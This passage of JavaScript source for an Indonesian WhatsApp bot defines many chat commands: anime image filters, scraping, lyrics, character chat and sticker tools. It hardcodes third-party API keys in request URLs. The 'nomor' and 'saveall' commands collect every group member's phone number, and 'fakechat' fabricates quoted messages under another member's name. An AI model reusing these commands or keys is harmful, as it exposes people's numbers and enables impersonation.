 video: { url: vid.media },
 caption: caption
 }, { quoted: m });
}
break
case 'ainime': {
 if (!isPrem) return m.reply(mess.premium);
 try {
 if (!text) return m.reply(`Reply Image Dengan ainime efeknya\n\nfairy_princess\nemoji\nfairy_friends\nsuperhero_comic\nmaid_dressing\nzhuxin\nbizarre_journey\npretty_soldier\nchristmas_anime\nanime_2d\nstarry_girl\ndark_gothic\nrandom_style\npirate_tale\negiptian_pharaoh\nrealistic_custom\nvintage_newspaper\nbiohazard\nonly_goth\nanime_custom\npixelart\nschool_days\nyearbook\ndead_festival\nhorror_night\n2d_anime\ntimes_square\nfriendship\nstar_player\ndaily_life\ncareer_elite\nps2_game\nretro_oscar\nbest_actress\noffice_worker\nmultiverse\nthinking_in_the_air\nmiracle_woman\nbushido\nunderwater_world\ncastle_ghost\ncode_v\ntechnology_future\nbest_actor\nmiami_scenery\nflame_art\ncolor_collision\ncosmic_fantasy\nbaby_angel\nfemale_pioneers\nbloody_romance\nwarrior_of_glory\ndaily_records\nemergencies\nstreet_art\nrrincess_outing\ngrassland_love\nretro_futuristic\nelf_archer\ncyber_chef\nline_magic\nconfident_girl\nyouth_years\nvice_city\npaper_empire\nmodern_art\ngoddess_gaze\nmagic_dungeon\nhell_moon\nred_years\nimperial_afterglow\nancient_kitchen\nfuture_graffiti\nfire_scene\naborigine\nwatercolor_magic\npower_struggle\nneon_dance_party\nski_game\nwitch_girl\non_vacation\nwatercolor_portrait\norcs\namerican_campus\nline_chef\ncultural_blend\npop_empire\nfuturpunk\nimprovisation\ncyber_sakura\nborder_resident\nabsolute_power\nancient_heroine\nsnap_fingers\ncooking_fun\nretro_arcade\nbattle_royal\npreppy_age\nclay_art\nvintage_anime`);
 
 m.reply(mess.wait); 
 const uploadImage = require('./lib/uploadImage');
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }

 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
 let fileSizeLimit = 5 * 1024 * 1024; // 5MB

 if (media.length > fileSizeLimit) {
 m.reply('Ukuran media tidak boleh melebihi 5MB');
 return;
 }

 let link = await (isTele ? uploadImage : uploadImage)(media);
 let { data } = await axios.get(`https://skizo.tech/api/mirror?apikey=sky33&url=${link}&filter=${text}`);
 
 if (data.message) return m.reply(JSON.stringify(data));
 
 await sky.sendMessage(m.chat, { image: { url: data.generated_image_addresses[0] }, caption: mess.done }, { quoted: m });
 } catch (error) {
 console.error(error);
 m.reply('Maaf, sedang terjadi gangguan. Silakan coba lagi nanti.');
 }
}
break
case 'toanime': {
 if (!isPrem) return replyprem(mess.premium)
 m.reply(mess.wait)
	const uploadImage = require('./lib/uploadImage')
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }

 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);

 let fileSizeLimit = 5 * 1024 * 1024; // 5MB

 if (media.length > fileSizeLimit) {
 m.reply('Ukuran media tidak boleh melebihi 5MB');
 return;
 }
 let link = await (isTele ? uploadImage : uploadImage)(media);
	let { data } = await axios.get(`https://skizo.tech/api/mirror?apikey=sky33&url=${link}&filter=anime_2d`)
	if (data.message) return m.reply(JSON.stringify(data))
	await sky.sendMessage(m.chat, { image: { url: data.generated_image_addresses[0] }, caption: mess.done }, { quoted: m })
}
break

case 'ttse': {
 if (!args[0]) {
 return await sky.sendMessage(m.chat, 'Silakan masukkan kata kunci pencarian.');
 }
m.reply(mess.wait)
 const axios = require('axios');

 try {
 const text = encodeURIComponent(args.join(' '));
 const apiUrl = `https://skizo.tech/api/tiktok-search?apikey=sky33&region=&keywords=${text}`;
 const response = await axios.get(apiUrl);

 if (response.status === 200) {
 const data = response.data;
 
 if (data.length > 0) {
 const firstResult = data[0];
 const videoUrl = firstResult.play;

 const caption = `
 Video ID: ${firstResult.video_id}
 Region: ${firstResult.region}
 Judul: ${firstResult.title}
 Durasi: ${firstResult.duration} detik
 `;

 await sky.sendMessage(m.chat, {
 video: {
 url: videoUrl
 },
 caption: caption,
 mimetype: 'video/mp4'
 });
 } else {
 return await sky.sendMessage(m.chat, 'Video tidak ditemukan.');
 }
 } else {
 return await sky.sendMessage(m.chat, 'Terjadi kesalahan saat mengambil data dari server.');
 }
 } catch (error) {
 console.error('Error:', error);
 return await sky.sendMessage(m.chat, 'Terjadi kesalahan saat melakukan pencarian.');
 }
 }
 break
case 'rpf': {
 const axios = require('axios');
 const cheerio = require('cheerio');

 async function randomRecipe() {
 return new Promise(async (resolve, reject) => {
 const rand = Math.floor(Math.random() * 100000) + 1;
 const link = `https://cookpad.com/id/resep/${rand}`;
 axios.get(link)
 .then(({ data }) => {
 const $ = cheerio.load(data);
 const result = {
 judul: $('h1.recipe-title').text(),
 deskripsi: $('div.description p').text(),
 bahan: [],
 langkah: [],
 foto: $('img.main-photo').attr('src'),
 penulis: $('div.author-name a').text(),
 rating: $('span.rating-average').text()
 };
 $('ul.ingredient-list li').each((i, el) => {
 result.bahan.push($(el).text());
 });
 $('ol.step-list li').each((i, el) => {
 result.langkah.push($(el).text());
 });
 resolve(result);
 })
 .catch(reject);
 });
 }

 randomRecipe()
 .then((recipe) => {
 const message = `
 Judul: ${recipe.judul}
 Deskripsi: ${recipe.deskripsi}
 Bahan:
 ${recipe.bahan.map((item, index) => `${index + 1}. ${item}`).join('\n')}
 Langkah:
 ${recipe.langkah.map((item, index) => `${index + 1}. ${item}`).join('\n')}
 Penulis: ${recipe.penulis}
 Rating: ${recipe.rating}
 Foto: ${recipe.foto}
 `;

 sky.sendMessage(m.chat, message);
 })
 .catch((error) => {
 console.error('Error:', error);
 sky.sendMessage(m.chat, 'Terjadi kesalahan saat mencari resep acak.');
 });
}
 break
case 'nomor': {
 // Dapatkan semua anggota grup
 const participants = await groupMetadata.participants

 // Inisialisasi variabel untuk menyimpan nomor
 let phoneNumbers = []

 // Looping melalui semua anggota
 participants.forEach(participant => {
 // Dapatkan nomor telepon
 const phoneNumber = participant.id.split('@')[0].replace('+62', '0')

 // Simpan nomor telepon jika valid
 if (phoneNumber.length > 8 && !isNaN(phoneNumber)) {
 phoneNumbers.push(phoneNumber)
 }
 })

 // Kirim daftar nomor telepon
 if (phoneNumbers.length > 0) {
 m.reply(`Daftar nomor telepon anggota grup:\n\n${phoneNumbers.join('\n')}`)
 } else {
 m.reply('Tidak ada nomor telepon yang ditemukan di grup ini.')
 }
}
break
case 'balik': {
 if (!m.quoted) return m.reply('Balas pesan yang ingin dibalik.')
 const quotedText = m.quoted.text ? m.quoted.text : ''
 const reversedText = quotedText.split('').reverse().join('')
 m.reply(reversedText)
}
break
case 'saveall': {
 if (!isPrem) return replyprem(mess.premium);
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');

 let contacts = [];
 let name = text ? text : sky.getName(m.sender);

 // Mengumpulkan seluruh anggota grup
 for (let member of participants) {
 let number = member.id.split('@')[0];
 let vcard = `
BEGIN:VCARD
VERSION:3.0
FN:@${number}
TEL;type=CELL;type=VOICE;waid=${number}:${m.sender.split('@')[0]}
END:VCARD`;
 contacts.push({ vcard });
 }

 // Mengirim semua kontak dalam satu pesan
 sky.sendMessage(m.chat, { contacts: { displayName: name, contacts } }, { quoted: fkontak });
}
break
case 'wikipedia':
 if (!text) {
 throw `Mohon masukkan kata kunci topik yang ingin Anda cari informasinya.\n\nContoh: Wikipedia Teknologi Informasi`;
 }

 m.reply('Mencari artikel Wikipedia...');

 try {
 const url = `https://id.wikipedia.org/wiki/${encodeURIComponent(text)}`;
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);

 const judul = $('#firstHeading').text().trim();
 const konten = $('#mw-content-text > div.mw-parser-output').find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');

 if (!konten) {
 throw new Error('Tidak ada artikel yang ditemukan untuk kata kunci tersebut.');
 }

 const artikel = `Judul: ${judul}\n\n${konten}`;
 m.reply(artikel);
 } catch (error) {
 m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
 }
 break
case 'listillusion': {
 const illusionList = [
 "pattern113",
 "pattern147",
 "pattern146",
 "pattern120",
 "pattern138",
 "pattern135",
 "pattern111",
 "pattern122",
 "pattern136",
 "pattern145",
 "pattern116",
 "pattern118",
 "pattern119",
 "pattern112",
 "pattern123",
 "pattern133",
 "pattern107",
 "pattern148",
 "pattern130",
 "pattern144",
 "pattern124",
 "pattern128",
 "pattern115",
 "pattern125",
 "pattern149",
 "pattern106",
 "pattern109",
 "pattern143",
 "pattern104",
 "pattern142",
 "pattern127",
 "pattern102",
 "pattern132",
 "pattern108",
 "pattern117",
 "pattern134",
 "pattern126",
 "pattern101",
 "pattern137",
 "pattern129",
 "pattern114",
 "pattern141",
 "pattern001"
 ];

 const illusionText = "Berikut adalah daftar ID dari ilusi yang tersedia:\n\n" + illusionList.join("\n");

 // Kirim daftar ilusi sebagai pesan balasan
 m.reply(illusionText);
}
 break
case 'illusion': {
 if (!isPrem) return replyprem(mess.premium)
 try {
 if (args1.length == 0) return m.reply(`reply image dengan id\n\ncek id ketik listillusion`);
 m.reply(mess.wait);
 const uploadImage = require('./lib/uploadImage');
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
 let fileSizeLimit = 5 * 1024 * 1024; // 5MB
 if (media.length > fileSizeLimit) {
 m.reply('Ukuran media tidak boleh melebihi 5MB');
 return;
 }
 let link = await (isTele ? uploadImage : uploadImage)(media);
 await sky.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/illusion?apikey=dila123&url=${link}&filterid=${text}&prompt=random` }, caption: `Created By Avosky-MD` });
 } catch (error) {
 console.error(error);
 m.reply('Coba lagi, sinyal gangguan.');
 }
}
break
case 'outpainting': {
 if (!isPrem) return replyprem(mess.premium)
 try {
 m.reply(mess.wait);
 const uploadImage = require('./lib/uploadImage');
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
 let fileSizeLimit = 5 * 1024 * 1024; // 5MB
 if (media.length > fileSizeLimit) {
 m.reply('Ukuran media tidak boleh melebihi 5MB');
 return;
 }
 let link = await (isTele ? uploadImage : uploadImage)(media);
 await sky.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/outpainting?apikey=dila123&url=${link}` }, caption: `Created By Avosky-MD` });
 } catch (error) {
 console.error(error);
 m.reply('Coba lagi, sinyal gangguan.');
 }
}
break
case 'whisper': {
 if (!text) throw `reply mp3`
 const uploadImage = require('./lib/uploadImage')
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }

 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);

 let fileSizeLimit = 5 * 1024 * 1024; // 5MB

 if (media.length > fileSizeLimit) {
 m.reply('Ukuran media tidak boleh melebihi 5MB');
 return;
 }

 let link = await (isTele ? uploadImage : uploadImage)(media);
 const { data } = await axios.get(`https://api.miftahganzz.my.id/api/ai/gpt-whisper?url=${link}&apikey=zex`);
 m.reply(`${data.data.text}`.trim());
}
break
case 'listanime': {
 const animeList = [
 { id: "anime103", title: "school" },
 { id: "anime126", title: "tokyo" },
 { id: "anime123", title: "galaxy" },
 { id: "anime110", title: "yuki" },
 { id: "anime109", title: "prince" },
 { id: "anime120", title: "paladin" },
 { id: "anime118", title: "tech" },
 { id: "anime121", title: "romantic" },
 { id: "anime108", title: "flame" },
 { id: "anime114", title: "manga" },
 { id: "anime131", title: "studio" },
 { id: "anime101", title: "fire" },
 { id: "anime102", title: "demon" },
 { id: "anime127", title: "lawyer" },
 { id: "anime104", title: "tradition" },
 { id: "anime135", title: "classy" },
 { id: "anime111", title: "future" },
 { id: "anime122", title: "cyberpunk" },
 { id: "anime119", title: "survivor" },
 { id: "anime133", title: "pirate" },
 { id: "anime115", title: "rockstar" },
 { id: "anime107", title: "horror" },
 { id: "anime105", title: "chibi" },
 { id: "anime117", title: "football" },
 { id: "anime125", title: "fantasy" },
 { id: "anime116", title: "ghost" },
 { id: "anime132", title: "captain" },
 { id: "anime134", title: "mariner" },
 { id: "anime124", title: "shinobi" },
 { id: "anime112", title: "isekai" },
 { id: "anime113", title: "space" },
 { id: "anime129", title: "shonen" },
 { id: "anime130", title: "battle" },
 { id: "anime128", title: "b_ball" },
 { id: "anime106", title: "vintage" },
 { id: "anime001", title: "custom" }
 ];

 let animeText = "Berikut adalah daftar anime:\n\n";
 animeList.forEach((anime, index) => {
 animeText += `${index + 1}. ID: ${anime.id}, Title: ${anime.title}\n`;
 });

 // Kirim daftar anime sebagai pesan balasan
 m.reply(animeText);
}
break        
case 'animeffect': {
 if (!isPrem) return replyprem(mess.premium)
 try {
 if (args1.length == 0) return m.reply(`reply media dengan id\n\ncek id ketik listanime`);
 m.reply(mess.wait);
 const uploadImage = require('./lib/uploadImage');
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
 let media = await q.download();
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
 let fileSizeLimit = 5 * 1024 * 1024; // 5MB
 if (media.length > fileSizeLimit) {
 m.reply('Ukuran media tidak boleh melebihi 5MB');
 return;
 }
 let link = await (isTele ? uploadImage : uploadImage)(media);
 await sky.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/animai?apikey=dila123&url=${link}&filterid=${text}&prompt=` }, caption: `Created By Avosky-MD` });
 } catch (error) {
 console.error(error);
 m.reply('Coba lagi, sinyal gangguan.');
 }
}
break
case 'sus': {
m.reply(`apa coba`)
}
break
 case 'lirik': {
 const axios = require('axios');
 const cheerio = require('cheerio');

 async function lirik(judul) {
 try {
 const searchUrl = `https://genius.com/api/search/multi?per_page=5&q=${encodeURIComponent(judul)}`;
 const searchResponse = await axios.get(searchUrl);
 const hits = searchResponse.data.response.sections[0].hits;

 if (hits.length === 0) {
 throw new Error('No results found');
 }

 const songUrl = hits[0].result.url;
 const lyricsResponse = await axios.get(songUrl);
 const $ = cheerio.load(lyricsResponse.data);

 const hasil = {
 thumb: $('meta[property="og:image"]').attr('content'),
 lirik: $('.lyrics').text().trim() || $('div[class^="Lyrics__Container"]').text().trim()
 };

 if (!hasil.lirik) {
 throw new Error('Lyrics not found');
 }

 return hasil;

 } catch (error) {
 return { error: error.message };
 }
 }

 if (!text) throw `Mau Musik apa?`;

 try {
 const result = await lirik(text);

 if (result.error) {
 m.reply(`Terjadi kesalahan: ${result.error}`);
 } else {
 const message = result.thumb ? `Thumbnail: ${result.thumb}\n\n${result.lirik}` : result.lirik;
 m.reply(message);
 }
 } catch (error) {
 console.error('Error fetching lyrics:', error);
 m.reply('Terjadi kesalahan saat mengambil lirik.');
 }
}
break
case 'listvoice': {
 try {
 const voiceList = [
 { voice: "special_week", category: "(Umamusume Pretty Derby)" },
 { voice: "silence_suzuka", category: "(Umamusume Pretty Derby)" },
 { voice: "tokai_teio", category: "(Umamusume Pretty Derby)" },
 { voice: "maruzensky", category: "(Umamusume Pretty Derby)" },
 { voice: "fuji_kiseki", category: "(Umamusume Pretty Derby)" },
 { voice: "oguri_cap", category: "(Umamusume Pretty Derby)" },
 { voice: "gold_ship", category: "(Umamusume Pretty Derby)" },
 { voice: "vodka", category: "(Umamusume Pretty Derby)" },
 { voice: "daiwa_scarlet", category: "(Umamusume Pretty Derby)" },
 { voice: "taiki_shuttle", category: "(Umamusume Pretty Derby)" },
 { voice: "grass_wonder", category: "(Umamusume Pretty Derby)" },
 { voice: "hishi_amazon", category: "(Umamusume Pretty Derby)" },
 { voice: "mejiro_mcqueen", category: "(Umamusume Pretty Derby)" },
 { voice: "el_condor_pasa", category: "(Umamusume Pretty Derby)" },
 { voice: "t.m._opera_o", category: "(Umamusume Pretty Derby)" },
 { voice: "narita_brian", category: "(Umamusume Pretty Derby)" },
 { voice: "symboli_rudolf", category: "(Umamusume Pretty Derby)" },
 { voice: "air_groove", category: "(Umamusume Pretty Derby)" },
 { voice: "agnes_digital", category: "(Umamusume Pretty Derby)" },
 { voice: "seiun_sky", category: "(Umamusume Pretty Derby)" },
 { voice: "tamamo_cross", category: "(Umamusume Pretty Derby)" },
 { voice: "fine_motion", category: "(Umamusume Pretty Derby)" },
 { voice: "biwa_hayahide", category: "(Umamusume Pretty Derby)" },
 { voice: "mayano_topgun", category: "(Umamusume Pretty Derby)" },
 { voice: "manhattan_cafe", category: "(Umamusume Pretty Derby)" },
 { voice: "mihono_bourbon", category: "(Umamusume Pretty Derby)" },
 { voice: "mejiro_ryan", category: "(Umamusume Pretty Derby)" },
 { voice: "yukino_bijin", category: "(Umamusume Pretty Derby)" },
 { voice: "rice_shower", category: "(Umamusume Pretty Derby)" },
 { voice: "ines_fujin", category: "(Umamusume Pretty Derby)" },
 { voice: "agnes_tachyon", category: "(Umamusume Pretty Derby)" },
 { voice: "admire_vega", category: "(Umamusume Pretty Derby)" },
 { voice: "inari_one", category: "(Umamusume Pretty Derby)" },
 { voice: "winning_ticket", category: "(Umamusume Pretty Derby)" },
 { voice: "air_shakur", category: "(Umamusume Pretty Derby)" },
 { voice: "eishin_flash", category: "(Umamusume Pretty Derby)" },
 { voice: "curren_chan", category: "(Umamusume Pretty Derby)" },
 { voice: "kawakami_princess", category: "(Umamusume Pretty Derby)" },
 { voice: "gold_city", category: "(Umamusume Pretty Derby)" },
 { voice: "sakura_bakushin_o", category: "(Umamusume Pretty Derby)" },
 { voice: "seeking_the_pearl", category: "(Umamusume Pretty Derby)" },
 { voice: "shinko_windy", category: "(Umamusume Pretty Derby)" },
 { voice: "sweep_tosho", category: "(Umamusume Pretty Derby)" },
 { voice: "super_creek", category: "(Umamusume Pretty Derby)" },
 { voice: "smart_falcon", category: "(Umamusume Pretty Derby)" },
 { voice: "zenno_rob_roy", category: "(Umamusume Pretty Derby)" },
 { voice: "tosen_jordan", category: "(Umamusume Pretty Derby)" },
 { voice: "nakayama_festa", category: "(Umamusume Pretty Derby)" },
 { voice: "narita_taishin", category: "(Umamusume Pretty Derby)" },
 { voice: "nishino_flower", category: "(Umamusume Pretty Derby)" },
 { voice: "haru_urara", category: "(Umamusume Pretty Derby)" },
 { voice: "bamboo_memory", category: "(Umamusume Pretty Derby)" },
 { voice: "matikane_fukukitaru", category: "(Umamusume Pretty Derby)" },
 { voice: "meisho_doto", category: "(Umamusume Pretty Derby)" },
 { voice: "mejiro_dober", category: "(Umamusume Pretty Derby)" },
 { voice: "nice_nature", category: "(Umamusume Pretty Derby)" },
 { voice: "king_halo", category: "(Umamusume Pretty Derby)" },
 { voice: "matikane_tannhauser", category: "(Umamusume Pretty Derby)" },
 { voice: "ikuno_dictus", category: "(Umamusume Pretty Derby)" },
 { voice: "mejiro_palmer", category: "(Umamusume Pretty Derby)" },
 { voice: "daitaku_helios", category: "(Umamusume Pretty Derby)" },
 { voice: "twin_turbo", category: "(Umamusume Pretty Derby)" },
 { voice: "satono_diamond", category: "(Umamusume Pretty Derby)" },
 { voice: "kitasan_black", category: "(Umamusume Pretty Derby)" },
 { voice: "sakura_chiyono_o", category: "(Umamusume Pretty Derby)" },
 { voice: "sirius_symboli", category: "(Umamusume Pretty Derby)" },
 { voice: "mejiro_ardan", category: "(Umamusume Pretty Derby)" },
 { voice: "yaeno_muteki", category: "(Umamusume Pretty Derby)" },
 { voice: "tsurumaru_tsuyoshi", category: "(Umamusume Pretty Derby)" },
 { voice: "mejiro_bright", category: "(Umamusume Pretty Derby)" },
 { voice: "sakura_laurel", category: "(Umamusume Pretty Derby)" },
 { voice: "narita_top_road", category: "(Umamusume Pretty Derby)" },
 { voice: "yamanin_zephyr", category: "(Umamusume Pretty Derby)" },
 { voice: "aston_machan", category: "(Umamusume Pretty Derby)" },
 { voice: "hayakawa_tazuna", category: "(Umamusume Pretty Derby)" },
 { voice: "kopano_rickey", category: "(Umamusume Pretty Derby)" },
 { voice: "wonder_acute", category: "(Umamusume Pretty Derby)" },
 { voice: "president_akikawa", category: "(Umamusume Pretty Derby)" },
 { voice: "ayachi_nene", category: "(Sanoba Witch)" },
 { voice: "inaba_meguru", category: "(Sanoba Witch)" },
 { voice: "shiiba_tsumugi", category: "(Sanoba Witch)" },
 { voice: "kariya_wakama", category: "(Sanoba Witch)" },
 { voice: "togakushi_touko", category: "(Sanoba Witch)" },
 { voice: "kujou_sara", category: "(Genshin Impact)" },
 { voice: "barbara", category: "(Genshin Impact)" },
 { voice: "paimon", category: "(Genshin Impact)" },
 { voice: "arataki_itto", category: "(Genshin Impact)" },
 { voice: "sayu", category: "(Genshin Impact)" },
 { voice: "xiangling", category: "(Genshin Impact)" },
 { voice: "kamisato_ayaka", category: "(Genshin Impact)" },
 { voice: "chongyun", category: "(Genshin Impact)" },
 { voice: "wanderer", category: "(Genshin Impact)" },
 { voice: "eula", category: "(Genshin Impact)" },
 { voice: "ningguang", category: "(Genshin Impact)" },
 { voice: "zhongli", category: "(Genshin Impact)" },
 { voice: "raiden_shogun", category: "(Genshin Impact)" },
 { voice: "kaedehara_kazuha", category: "(Genshin Impact)" },
 { voice: "cyno", category: "(Genshin Impact)" },
 { voice: "noelle", category: "(Genshin Impact)" },
 { voice: "yae_miko", category: "(Genshin Impact)" },
 { voice: "kaeya", category: "(Genshin Impact)" },
 { voice: "xiao", category: "(Genshin Impact)" },
 { voice: "thoma", category: "(Genshin Impact)" },
 { voice: "klee", category: "(Genshin Impact)" },
 { voice: "diluc", category: "(Genshin Impact)" },
 { voice: "yelan", category: "(Genshin Impact)" },
 { voice: "shikanoin_heizou", category: "(Genshin Impact)" },
 { voice: "xinyan", category: "(Genshin Impact)" },
 { voice: "lisa", category: "(Genshin Impact)" },
 { voice: "yun_jin", category: "(Genshin Impact)" },
 { voice: "candace", category: "(Genshin Impact)" },
 { voice: "rosaria", category: "(Genshin Impact)" },
 { voice: "beidou", category: "(Genshin Impact)" },
 { voice: "sangonomiya_kokomi", category: "(Genshin Impact)" },
 { voice: "yanfei", category: "(Genshin Impact)" },
 { voice: "kuki_shinobu", category: "(Genshin Impact)" },
 { voice: "yoimiya", category: "(Genshin Impact)" },
 { voice: "amber", category: "(Genshin Impact)" },
 { voice: "diona", category: "(Genshin Impact)" },
 { voice: "bennett", category: "(Genshin Impact)" },
 { voice: "razor", category: "(Genshin Impact)" },
 { voice: "albedo", category: "(Genshin Impact)" },
 { voice: "venti", category: "(Genshin Impact)" },
 { voice: "player_male", category: "(Genshin Impact)" },
 { voice: "kamisato_ayato", category: "(Genshin Impact)" },
 { voice: "jean", category: "(Genshin Impact)" },
 { voice: "alhaitham", category: "(Genshin Impact)" },
 { voice: "mona", category: "(Genshin Impact)" },
 { voice: "nilou", category: "(Genshin Impact)" },
 { voice: "hu_tao", category: "(Genshin Impact)" },
 { voice: "ganyu", category: "(Genshin Impact)" },
 { voice: "nahida", category: "(Genshin Impact)" },
 { voice: "keqing", category: "(Genshin Impact)" },
 { voice: "player_female", category: "(Genshin Impact)" },
 { voice: "aloy", category: "(Genshin Impact)" },
 { voice: "collei", category: "(Genshin Impact)" },
 { voice: "dori", category: "(Genshin Impact)" },
 { voice: "tighnari", category: "(Genshin Impact)" },
 { voice: "sucrose", category: "(Genshin Impact)" },
 { voice: "xingqiu", category: "(Genshin Impact)" },
 { voice: "oz", category: "(Genshin Impact)" },
 { voice: "gorou", category: "(Genshin Impact)" },
 { voice: "tartalia", category: "(Genshin Impact)" },
 { voice: "qiqi", category: "(Genshin Impact)" },
 { voice: "shenhe", category: "(Genshin Impact)" },
 { voice: "layla", category: "(Genshin Impact)" },
 { voice: "fishl", category: "(Genshin Impact)" }
 // Lanjutkan dengan daftar suara Genshin Impact dan Sanoba Witch sesuai dengan daftar yang Anda berikan
 ];

 let voiceText = "Berikut adalah daftar suara yang tersedia:\n\n";
 voiceList.forEach((voice, index) => {
 voiceText += `${index + 1}. Voice: ${voice.voice}, Category: ${voice.category}\n`;
 });

 // Kirim daftar suara sebagai pesan balasan
 m.reply(voiceText);
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan dalam memproses permintaan.');
 }
}
break
case 'pe': case 'getbalance':{
				 if (!isCreator) throw mess.owner
					let moneyy = `${Math.floor(Math.random() * 1000000000000)}`.trim()
db.data.users[m.sender].balance += moneyy * 1
 m.reply(`Bot Sudah Memasukan limit Sebesar ${moneyy} Ke Owner`)
 }
 break
case 'setid': {
 if (!args[0]) return m.reply("Format: *setid [ID]*");

 const newId = args[0];

 let caiiData = {}; // Inisialisasi objek kosong

 try {
 caiiData = JSON.parse(fs.readFileSync('./database/cai.json')); // Baca file JSON
 } catch (error) {
 // Tangani kesalahan jika file JSON kosong atau rusak
 console.error("Error reading or parsing JSON file:", error);
 }

 // Tetapkan ID baru ke properti "id" di dalam objek JSON
 caiiData.id = newId;

 // Simpan perubahan ke dalam file JSON
 fs.writeFileSync('./database/cai.json', JSON.stringify(caiiData, null, 2));

 m.reply(`ID berhasil ditetapkan.`);
}
break
case 'idsearch': {
 if (!text) throw `mau id apa`
 try {
 const { data } = await axios.get(`https://api.apigratis.site/cai/search_characters?query=${q}`);
 m.reply(`${data.result.characters[0].external_id}`.trim());
 } catch (error) {
 m.reply("Maaf, sedang terjadi gangguan. Mohon coba lagi nanti.");
 }
}
break
 case 'cai': {
 try {
 if (!text) throw "Please provide a valid text input.";

 let caiData = {};
 try {
 caiData = JSON.parse(fs.readFileSync('./database/cai.json'));
 } catch (error) {
 console.error("Error reading or parsing JSON file:", error);
 throw "Error reading character data.";
 }

 const characterId = caiData.name; // Mengambil nama karakter dari data JSON
 const apiUrl = `https://widipe.com/ai/c-ai?prompt=${characterId}&text=${encodeURIComponent(text)}`;
 
 const response = await fetch(apiUrl, {
 method: "GET",
 headers: {
 "Content-Type": "application/json",
 }
 });

 const responseData = await response.json();
 if (responseData.status) {
 const replyText = responseData.result;
 m.reply(replyText.trim());
 } else {
 throw "Invalid response received from the API.";
 }
 } catch (error) {
 console.error("Error processing CAI request:", error);
 m.reply("Sorry, there was an issue. Please try again later.");
 }
}
break
case'fakechat': {
const { Sticker } = require('wa-sticker-formatter');
 let quotedMessage = m.quoted ? m.quoted : m;
 let mimeType = (quotedMessage.msg || quotedMessage).mimetype || '';
 if (!mimeType) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
const uploadImage = require('./lib/uploadImage');
 let text = args.join(' ');
 if (!text) throw `Contoh: ${usedPrefix + command} halo`;

 let avatar = await sky.profilePictureUrl(quotedMessage.sender, 'image').catch(_ => 'https://i.ibb.co/2WzLyGk/profile.jpg');
 avatar = /tele/.test(avatar) ? avatar : await uploadImage((await sky.getFile(avatar)).data);

 async function fakechat(text, name, url) {
 let body = {
 "type": "quote",
 "format": "webp",
 "backgroundColor": "#FFFFFF",
 "width": 512,
 "height": 512,
 "scale": 2,
 "messages": [{
 "avatar": true,
 "from": {
 "first_name": name,
 "language_code": "en",
 "name": name,
 "photo": {
 "url": url
 }
 },
 "text": text,
 "replyMessage": {}
 }]
 }
 let res = await axios.post('https://quotly.netorare.codes/generate', body);
 return Buffer.from(res.data.result.image, "base64");
 }

 async function fakechatImg(url, text, name, avatar) {
 let body = {
 "type": "quote",
 "format": "png",
 "backgroundColor": "#FFFFFF",
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [{
 "entities": [],
 "media": {
 "url": url
 },
 "avatar": true,
 "from": {
 "id": 1,
 "name": name,
 "photo": {
 "url": avatar
 }
 },
 "text": text,
 "replyMessage": {}
 }]
 }
 let res = await axios.post('https://quotly.netorare.codes/generate', body);
 return Buffer.from(res.data.result.image, "base64");
 }

 if (!/image\/(jpe?g|png)/.test(mimeType)) {
 let req = await fakechat(text, quotedMessage.sender, avatar);
 let sticker = await createSticker(req, false, `avs`, `AVS`);
 sky.sendImageAsSticker(m.chat, sticker, m, { packname: global.packname, author: global.author });
 } else {
 let img = await quotedMessage.download();
 let url = await uploadImage(img);
 let req = await fakechatImg(url, text, quotedMessage.sender, avatar);
 let sticker = await createSticker(req, false, `avs`, `m`);
 sky.sendImageAsSticker(m.chat, sticker, m, { packname: global.packname, author: global.author });
 }

 async function createSticker(req, url, packName, authorName, quality) {
 let stickerMetadata = {
 type: 'full',
 pack: `avs`,
 author: `avs`,
 quality
 }
 return (new Sticker(req ? req : url, stickerMetadata)).toBuffer()
 }
}
break
case 'jail': {
const uploadImage = require('./lib/uploadImage')
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) {
 m.reply('Tidak ada media yang ditemukan');
 return;
 }
    const media = await sky.downloadAndSaveMediaMessage(quoted)
	const { TelegraPh } = require('./lib/uploader')
	const anu = await TelegraPh(media)
kaytid = await getBuffer(`https://some-random-api.com/canvas/overlay/jail?avatar=${anu}`)
sky.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
 }
break
case 'listnomor': {
 if (!isCreator) return m.reply(mess.owner);
 const usersList = Object.keys(db.data.users);
 
 if (usersList.length === 0) {
 m.reply('Belum ada pengguna terdaftar.');
 } else {
